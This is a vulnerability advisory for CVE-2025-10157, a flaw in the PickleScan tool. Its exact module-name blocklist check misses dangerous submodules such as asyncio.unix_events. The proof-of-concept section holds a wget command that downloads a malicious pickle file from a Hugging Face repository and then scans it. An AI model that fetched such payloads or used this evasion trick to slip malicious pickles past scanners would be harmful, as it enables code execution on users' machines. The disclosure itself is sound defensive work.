---
description: A bypass in PickleScan's unsafe globals check allows malicious code execution via submodules of dangerous packages.
title: PickleScan Unsafe Globals Check Bypass via Submodule Imports
date_published: "2025-09-21"
last_updated: "2025-09-21"
xray_id: XRAY-720930
vul_id: CVE-2025-10157
cvss: 8.3
severity: high
discovered_by: David Cohen
type: vulnerability

---

## Summary

A Protection Mechanism Failure vulnerability in picklescan allows a remote attacker to bypass the unsafe globals check. This is possible because the scanner performs an exact match for module names, allowing malicious payloads to be loaded via submodules of dangerous packages (e.g., `asyncio.unix_events` instead of `asyncio`). When the file, incorrectly deemed safe, is loaded, it can lead to malicious code execution.

## Component

[picklescan](https://pypi.org/project/picklescan/)

## Affected versions

( , 0.0.31)

## Description

The vulnerability exists in PickleScan's mechanism for identifying unsafe global imports in pickle files. The scanner checks for dangerous modules by comparing the imported module's name against a blocklist using an exact string match. An attacker can circumvent this check by importing a submodule of a dangerous package (e.g., `asyncio.unix_events`) instead of the parent package itself (`asyncio`). Because `asyncio.unix_events` is not an exact match for `asyncio` in the blocklist, PickleScan fails to flag the import as dangerous, allowing the malicious file to pass the scan.

## PoC

The following steps demonstrate the bypass.

```bash
# 1. Download a malicious pickle file that uses a submodule of a dangerous package.
wget https://huggingface.co/iluem/linux_pkl/resolve/main/asyncio_asyncio_unix_events___UnixSubprocessTransport__start.pkl

# 2. Scan the file with PickleScan.
picklescan -p asyncio_asyncio_unix_events___UnixSubprocessTransport__start.pkl -g

# Observed Result: PickleScan marks the import as "Suspicious" but fails to identify it as a "dangerous" import, allowing it to pass.
# Expected Result: PickleScan should recognize any submodule of 'asyncio' as dangerous and flag the file as malicious.
```

## Vulnerability Mitigations

No mitigations are supplied for this issue

## References

[GHSA](https://github.com/advisories/GHSA-f7qq-56ww-84cr)
[NVD](https://nvd.nist.gov/vuln/detail/CVE-2025-10157)
